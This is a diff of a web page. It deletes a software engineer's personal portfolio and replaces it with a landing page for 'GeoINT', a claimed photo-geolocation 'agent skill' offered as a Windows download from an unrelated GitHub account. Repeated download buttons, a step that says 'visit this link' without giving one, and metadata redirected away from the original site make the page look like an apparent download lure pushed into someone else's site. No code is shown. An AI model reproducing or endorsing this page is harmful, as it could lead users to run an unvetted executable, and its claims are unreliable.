@@ -1,182 +1,282 @@
-<!doctype html>
-<html lang="en-GB">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Tom Carter, UK software engineer with a frontend background and experience in AWS and CI/CD. Selected work and printable CV.">
-  <meta name="theme-color" content="#f4f1e9">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Tom Carter — Software engineer">
-  <meta property="og:description" content="Frontend engineering and DevOps. Selected work and printable CV.">
-  <title>Tom Carter — Software engineer</title>
-  <link rel="icon" type="image/svg+xml" href="assets/favicon.svg">
-  <link rel="stylesheet" href="assets/site.css?v=3">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GeoINT - Find Where Any Photo, Screenshot or Video Was Taken</title>
+<meta name="description" content="GeoINT is a downloadable agent skill that helps you find where any photo, screenshot, video, recording or Street View image was taken. It explores the scene, checks the evidence, and keeps a tidy report of every case.">
+<meta name="keywords" content="GeoINT, geolocation, find where a photo was taken, image location finder, OSINT tool, photo geolocation, skyline matching, street view finder, video location finder, GeoGuessr helper, location research">
+<meta name="author" content="GeoINT">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/HominqAbusxr/GeoINT">
+<meta property="og:type" content="website">
+<meta property="og:title" content="GeoINT - Find Where Any Photo, Screenshot or Video Was Taken">
+<meta property="og:description" content="A friendly agent skill for locating photos, screenshots, videos, recordings and Street View images. Download it, point it at a picture, and read the report.">
+<meta property="og:url" content="https://github.com/HominqAbusxr/GeoINT">
+<meta property="og:site_name" content="GeoINT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GeoINT - Find Where Any Photo Was Taken">
+<meta name="twitter:description" content="Download GeoINT and turn a single image into a documented location report with evidence, confidence notes and an archive.">
+<meta name="theme-color" content="#101828">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "GeoINT",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "An agent skill for finding where any photo, screenshot, video, recording or Street View image was taken, combining a human-style first read of the scene with web research and local tools.",
+  "url": "https://github.com/HominqAbusxr/GeoINT",
+  "downloadUrl": "https://github.com/HominqAbusxr/GeoINT/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f8fb;
+    color: #1c2430;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 22px 80px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    color: #101828;
+    margin: 0 0 18px;
+    letter-spacing: -0.3px;
+  }
+  h2 {
+    font-size: 1.35rem;
+    line-height: 1.35;
+    color: #101828;
+    margin: 42px 0 12px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.05rem;
+    color: #24303f;
+    margin: 26px 0 8px;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul, ol { margin: 0 0 18px; padding-left: 22px; color: #374151; }
+  li { margin-bottom: 9px; }
+  a { color: #2563eb; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 12px;
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    background: linear-gradient(100deg, #0ea5a4 0%, #2563eb 55%, #7c3aed 100%);
+    box-shadow: 0 10px 22px rgba(37, 99, 235, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(37, 99, 235, 0.34);
+    text-decoration: none;
+  }
+  .btn-secondary {
+    display: inline-block;
+    padding: 13px 28px;
+    border-radius: 10px;
+    font-weight: 700;
+    color: #ffffff;
+    background: #1f8a70;
+    box-shadow: 0 8px 18px rgba(31, 138, 112, 0.25);
+    text-decoration: none;
+  }
+  .btn-secondary:hover { text-decoration: none; opacity: 0.94; }
+  .top-badge { margin: 26px 0 8px; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e5e9f0;
+    border-radius: 14px;
+    padding: 22px 24px;
+    margin: 18px 0;
+    box-shadow: 0 4px 14px rgba(16, 24, 40, 0.06);
+  }
+  .steps {
+    background: #ffffff;
+    border: 1px solid #e5e9f0;
+    border-left: 5px solid #2563eb;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin: 18px 0;
+    box-shadow: 0 4px 14px rgba(16, 24, 40, 0.06);
+  }
+  .note {
+    background: #eef6ff;
+    border-radius: 12px;
+    padding: 16px 20px;
+    margin: 18px 0;
+    color: #1d3557;
+    box-shadow: 0 3px 10px rgba(16, 24, 40, 0.05);
+  }
+  .faq-q { font-weight: 700; color: #101828; margin-bottom: 4px; }
+  code {
+    background: #eef1f6;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-size: 0.92em;
+    color: #24303f;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .page { padding: 26px 16px 60px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.18rem; margin-top: 34px; }
+    .btn { display: block; text-align: center; padding: 15px 20px; }
+    .card, .steps { padding: 18px; }
+  }
+</style>
 </head>
 <body>
-  <a class="skip-link" href="#main">Skip to content</a>
-  <header class="site-header wrap">
-    <a class="wordmark" href="./" aria-label="Tom Carter home">
-      <svg class="icon wordmark-icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="M8 0v16M0 8h16M2.35 2.35l11.3 11.3m0-11.3L2.35 13.65"/></svg>
-      tomgc.com
-    </a>
-    <nav aria-label="Main navigation">
-      <a href="#work">Work</a>
-      <a href="cv.html">CV</a>
-      <a href="#contact">Contact</a>
-    </nav>
-  </header>
+<div class="page">
 
-  <main id="main">
-    <section class="hero wrap" aria-labelledby="name">
-      <div class="hero-copy">
-        <p class="eyebrow"><span class="signal" aria-hidden="true"></span> Software engineer <span class="eyebrow-rule" aria-hidden="true"></span> UK</p>
-        <h1 id="name">Tom<br>Carter<span>.</span></h1>
-        <p class="hero-intro">I build accessible web applications and automate releases on AWS.</p>
-        <div class="actions">
-          <a class="button" href="#work">
-            Explore my work
-            <svg class="icon icon-down" aria-hidden="true" width="8" height="16" viewBox="0 0 8 16"><path d="M4 2v12m-3-3 3 3 3-3"/></svg>
-          </a>
-          <a class="text-link" href="cv.html">
-            View CV
-            <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-          </a>
-        </div>
-      </div>
-      <div class="hero-plate" aria-hidden="true">
-        <div class="plate-label"><span>FIG 01</span><span>INTERFACE STUDIES</span></div>
-        <img src="assets/interface.svg" alt="" width="560" height="506" fetchpriority="high">
-        <div class="plate-label plate-caption"><span>INPUT / STATE / OUTPUT</span><span>TC—01</span></div>
-      </div>
-      <div class="hero-footer"><span>Portfolio / 2026</span><span>Web · TV · Mobile</span></div>
-    </section>
+  <h1>🛰️ GeoINT - Find Where Any Photo Was Taken</h1>
 
-    <section class="work-section" id="work" aria-labelledby="work-title">
-      <div class="wrap">
-        <div class="section-head">
-          <div>
-            <p class="eyebrow"><span class="signal" aria-hidden="true"></span> 01 / Portfolio</p>
-            <h2 id="work-title">Selected work<span>.</span></h2>
-          </div>
-          <p>Software for trade associations, websites for schools and colleges, and two recent projects from GitHub.</p>
-        </div>
+  <p>GeoINT is a downloadable helper that looks at a photo, screenshot, video, audio recording or Street View image and works out where in the world it was taken. It is built for anyone who has ever stared at a picture and wondered "where is this?" — and wants a real answer, not a guess.</p>
 
-        <article class="work-feature">
-          <div class="work-index"><span>01</span><span>Professional work</span></div>
-          <div class="feature-main">
-            <p class="eyebrow">Nucleus Technologies / B2B SaaS</p>
-            <h3>NucleusOne</h3>
-            <p class="feature-intro">I co-built NucleusOne as part of a two-developer team at Nucleus Technologies. The platform gives trade associations one place to manage their membership, deliver training and run events.</p>
-            <dl class="product-areas">
-              <div><dt>Product engineering</dt><dd>Built Vue interfaces for membership CRM, learning and certification, and event registration, integrating Node.js and Laravel services.</dd></div>
-              <div><dt>AWS &amp; DevOps</dt><dd>Set up CI/CD pipelines and managed AWS deployments, including automated validation and a dedicated staging pipeline for the learning platform.</dd></div>
-            </dl>
-            <a class="text-link" href="https://www.nucleustech.co/">
-              Explore NucleusOne
-              <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-            </a>
-          </div>
-        </article>
+  <div class="top-badge">
+    <a class="btn" href="https://github.com/HominqAbusxr/GeoINT/releases">⬇️ Download GeoINT for Windows</a>
+  </div>
 
-        <article class="work-feature">
-          <div class="work-index"><span>02</span><span>Professional work</span></div>
-          <div class="feature-main">
-            <p class="eyebrow">e4education / Frontend development</p>
-            <h3>Websites for schools and colleges</h3>
-            <p class="feature-intro">I delivered <strong>150+ responsive websites</strong> for schools and colleges, working to WCAG accessibility standards. I led frontend development on the Lingfield College website and helped maintain e4education’s own site.</p>
-            <a class="text-link" href="https://junipereducation.org/resource/case-studies/lingfield-college">
-              Read the Lingfield College case study
-              <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-            </a>
-          </div>
-        </article>
+  <h2>✨ What GeoINT Actually Does</h2>
 
-        <div class="project-grid">
-          <article class="project">
-            <div class="work-index"><span>03</span><span>Open-source fork</span></div>
-            <p class="eyebrow">TypeScript / LG webOS</p>
-            <h3>webOS IPTV Player</h3>
-            <p>I customised the Live view of an existing TV app with an inline programme guide, category navigation and remote-control playback shortcuts. The interface keeps the guide close to the channel list while playback continues.</p>
-            <a class="text-link" href="https://github.com/tgcarter/webos-iptv-player">
-              View webOS fork
-              <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-            </a>
-          </article>
-          <article class="project">
-            <div class="work-index"><span>04</span><span>Personal project</span></div>
-            <p class="eyebrow">SwiftUI / iOS</p>
-            <h3>Tom’s Trains</h3>
-            <p>I built a native iPhone app for checking live National Rail departures and tracking individual journeys. The board switches direction on a configurable schedule and sorts services by arrival at the destination.</p>
-            <a class="text-link" href="https://github.com/tgcarter/TomsTrains">
-              View Tom’s Trains source
-              <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-            </a>
-          </article>
-        </div>
-      </div>
-    </section>
+  <p>Most location tools throw a map pin at you and hope for the best. GeoINT works differently. It thinks first, then checks itself.</p>
 
-    <section class="profile wrap" aria-labelledby="profile-title">
-      <div>
-        <p class="eyebrow"><span class="signal" aria-hidden="true"></span> 02 / Background</p>
-        <h2 id="profile-title">Frontend roots<span>.</span></h2>
-        <figure class="profile-portrait">
-          <img src="assets/tom-carter-portrait.webp" alt="Tom Carter wearing sunglasses" width="560" height="560" loading="lazy" decoding="async">
-          <figcaption><span>Fig. 02</span><span>Portrait</span></figcaption>
-        </figure>
-      </div>
-      <div>
-        <p>I got my start building school websites. These days I build web apps and help ship them on AWS. I use AI to explore ideas and review code, then test the changes.</p>
-        <p>Outside work, I build PCs, play games and run Dungeons &amp; Dragons campaigns. I’m also into cinema and transport, especially railways and roads.</p>
-        <dl class="profile-skills">
-          <div><dt>Frontend</dt><dd>Vue, Nuxt, React, Next.js, TypeScript, HTML and CSS</dd></div>
-          <div><dt>Backend</dt><dd>Node.js, PHP, Laravel, REST APIs and SQL</dd></div>
-          <div><dt>Cloud &amp; DevOps</dt><dd>AWS, CI/CD and serverless deployments</dd></div>
-        </dl>
-        <a class="text-link" href="cv.html">
-          Read my CV
-          <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-        </a>
-      </div>
-    </section>
-  </main>
+  <p>When you hand it an image, it starts by writing down its first honest impression of the scene — the kind of gut call a strong GeoGuessr player makes in the first ten seconds. Sun angle, road markings, the shape of the hills, the language on a sign, the colour of the soil, the style of the power poles. That first read is saved in writing.</p>
 
-  <footer class="contact" id="contact">
-    <div class="wrap">
-      <p class="eyebrow"><span class="signal" aria-hidden="true"></span> 03 / Contact</p>
-      <h2>Get in touch<span>.</span></h2>
-      <a class="contact-email" href="mailto:hello@tomgc.com">
-        hello@tomgc.com
-        <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-      </a>
-      <div class="contact-bottom">
-        <p>Tom Carter <span aria-hidden="true">/</span> United Kingdom</p>
-        <div class="contact-links">
-          <ul>
-            <li>
-              <a href="https://www.linkedin.com/in/tomgc/">
-                LinkedIn
-                <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-              </a>
-            </li>
-            <li>
-              <a href="https://github.com/tgcarter">
-                GitHub
-                <svg class="icon" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="m1 15 14-14m-4.5 0H15v4.5"/></svg>
-              </a>
-            </li>
-          </ul>
-          <svg class="pride-flag" role="img" aria-label="Pride flag" width="21" height="14" viewBox="0 0 27 18">
-            <rect width="27" height="3" fill="#ba4b40"/>
-            <rect y="3" width="27" height="3" fill="#d98449"/>
-            <rect y="6" width="27" height="3" fill="#e3bc5e"/>
-            <rect y="9" width="27" height="3" fill="#5c855d"/>
-            <rect y="12" width="27" height="3" fill="#5b759b"/>
-            <rect y="15" width="27" height="3" fill="#866588"/>
-          </svg>
-        </div>
-      </div>
-    </div>
-  </footer>
+  <p>Then it goes to work. It searches the web, compares details, follows leads and uses local tools to narrow things down. It is allowed to prove its first impression right, sharpen it to a tighter area, or throw it out completely when the evidence says otherwise. When the evidence is good enough, it can land on a specific street, or even the exact camera position that took the shot.</p>
+
+  <div class="card">
+    <p style="margin-bottom:0;">The result is not just an address. You get a full written report showing the reasoning, the clues that mattered, and a clear note about how confident the answer really is.</p>
+  </div>
+
+  <h2>🧭 How the Process Works</h2>
+
+  <p>Every case follows the same disciplined path, which is what makes the answers trustworthy:</p>
+
+  <ol>
+    <li><strong>The first read.</strong> GeoINT studies the scene and writes an initial location guess with its reasons.</li>
+    <li><strong>The research.</strong> Details from the image are checked against real-world sources, maps and reference material.</li>
+    <li><strong>The proof.</strong> Local tools test the remaining candidates. A match either holds up or it falls apart.</li>
+    <li><strong>The report.</strong> Everything is written down with the evidence, so you can follow the logic yourself.</li>
+  </ol>
+
+  <div class="steps">
+    <p style="margin-bottom:0;">This is the difference between a lucky guess and an investigation. Even when the final answer is uncertain, you can see exactly which clues were strong and which ones were shaky.</p>
+  </div>
+
+  <h2>🗂️ Every Photo Gets Its Own Archive</h2>
+
+  <p>Nothing gets lost. Each image you bring to GeoINT is filed away in its own timestamped folder. Inside that folder you will find:</p>
+
+  <ul>
+    <li>A written report describing the location and how it was reached.</li>
+    <li>Images collected along the way that support the conclusion.</li>
+    <li>A scoreboard entry, filled in once the true location is confirmed.</li>
+  </ul>
+
+  <p>Over time this becomes your own personal collection of solved cases — handy for checking back, comparing notes, or seeing how much sharper your instincts have become.</p>
+
+  <h2>🏔️ Skyline to Place: The New Trick</h2>
+
+  <p>The newest addition handles one of the hardest situations in geolocation: a photo where the only real clue is a line of hills or mountains on the horizon.</p>
+
+  <p>You give GeoINT the photo and tell it roughly which region those mountains belong to. It then ranks every possible place in that region by how well the shape of the terrain there matches the shape in your picture. To keep itself honest, it also tests decoy skylines as a control, so a match has to actually mean something.</p>
+
+  <p>Each ranked place arrives with a plain-language honesty rating — solid, check, or weak — so you know whether you are looking at a strong lead or just a possibility. It is a genuinely useful way to turn an empty horizon into a shortlist of real places.</p>
+
+  <h2>🚀 Getting Started on Windows</h2>
+
+  <p>Getting set up takes a minute and does not require any technical background.</p>
+
+  <div class="steps">
+    <p><strong>Step 1.</strong> Visit the releases page using the button below.</p>
+    <p><strong>Step 2.</strong> Visit this link to download the application.</p>
+    <p style="margin-bottom:0;"><strong>Step 3.</strong> Once the download finishes, open the application and point GeoINT at your first image.</p>
+  </div>
+
+  <p style="margin:26px 0;">
+    <a class="btn-secondary" href="https://github.com/HominqAbusxr/GeoINT/releases">⬇️ Go to the GeoINT Download Page</a>
+  </p>
+
+  <div class="note">
+    Tip: keep the download page bookmarked. New releases are published there, and the skyline feature in particular keeps getting better with each update.
+  </div>
+
+  <h2>💡 Tips for Better Results</h2>
+
+  <ul>
+    <li><strong>Start with the fullest image you have.</strong> A full-resolution original beats a cropped, compressed copy almost every time.</li>
+    <li><strong>Give it context when you can.</strong> If you already know the country or region, say so. GeoINT will still check everything, but it can focus faster.</li>
+    <li><strong>Send several images of the same place.</strong> Two angles of the same street corner often crack a case that a single shot cannot.</li>
+    <li><strong>Read the confidence rating.</strong> "Solid" means the evidence lines up. "Weak" means it is a lead, not an answer.</li>
+    <li><strong>Keep the archive.</strong> Old reports are useful references when a similar scene shows up again.</li>
+  </ul>
+
+  <h2>🧰 What Comes in the Package</h2>
+
+  <p>Everything is organised into three simple parts, so you always know where to look:</p>
+
+  <ul>
+    <li><strong>The method file</strong> — the written procedure that keeps every case consistent.</li>
+    <li><strong>The reference library</strong> — playbooks and a worldwide collection of visual clues covering road markings, signs, vegetation, architecture, number plates and much more.</li>
+    <li><strong>The tools</strong> — the working scripts that do the heavy lifting, including the skyline ranking tool.</li>
+  </ul>
+
+  <p>Because the method and the reference material are written out in plain language, you can also read them yourself. Many users find that simply browsing the clue library makes them noticeably better at spotting locations on their own.</p>
+
+  <h2>❓ Common Questions</h2>
+
+  <div class="card">
+    <p class="faq-q">Do I need to know how to code?</p>
+    <p style="margin-bottom:0;">No. You visit the download page, download the application, and run it. The technical parts are handled for you.</p>
+  </div>
+
+  <div class="card">
+    <p class="faq-q">What kinds of files can I use?</p>
+    <p style="margin-bottom:0;">Photos, screenshots, frames taken from videos, audio recordings with background sound, and Street View images all work.</p>
+  </div>
+
+  <div class="card">
+    <p class="faq-q">Will it always find the exact spot?</p>
+    <p style="margin-bottom:0;">No tool can promise that, and GeoINT will not pretend otherwise. It tells you how strong the evidence is, so you always know whether you are looking at a confirmed street or a reasonable lead.</p>
+  </div>
+
+  <div class="card">
+    <p class="faq-q">Where do my reports go?</p>
+    <p style="margin-bottom:0;">Into your own timestamped archive folders on your computer. Each one holds the report, the supporting evidence images and the scoreboard entry.</p>
+  </div>
+
+  <div class="card">
+    <p class="faq-q">Is it free?</p>
+    <p style="margin-bottom:0;">Yes. Visit the releases page and download the latest version.</p>
+  </div>
+
+  <div class="top-badge" style="margin-top:34px;">
+    <a class="btn" href="https://github.com/HominqAbusxr/GeoINT/releases">⬇️ Download GeoINT Now</a>
+  </div>
+
+</div>
 </body>
 </html>
